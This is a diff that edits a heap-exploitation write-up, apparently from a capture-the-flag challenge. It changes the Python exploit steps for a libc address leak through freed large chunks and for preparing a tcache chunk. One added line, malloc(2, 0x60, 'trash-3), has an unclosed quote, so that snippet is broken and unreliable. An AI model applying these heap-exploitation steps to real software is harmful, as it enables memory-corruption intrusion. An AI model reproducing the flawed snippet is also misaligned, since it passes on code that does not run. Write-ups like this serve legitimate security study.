@@ -110,9 +110,10 @@ The exploit has two stages:
 
 ### Stage 1 — Libc Leak
 
-We allocate and free a large chunk:
+We allocate and free 2 large chunks:
 ```python
-malloc(0, 1280, 'A') 
+malloc(0, 1280, 'trash-0')
+malloc(1, 1280, 'trash-1')
 free(0)
 insp3ct(0)
 ```
@@ -128,7 +129,7 @@ libc.address = leak - 0x3ebca0
 
 We prepare a tcache chunk:
 ```python
-malloc(2, 0x60, 'B')
+malloc(2, 0x60, 'trash-3)
 free(2)
 ```
 
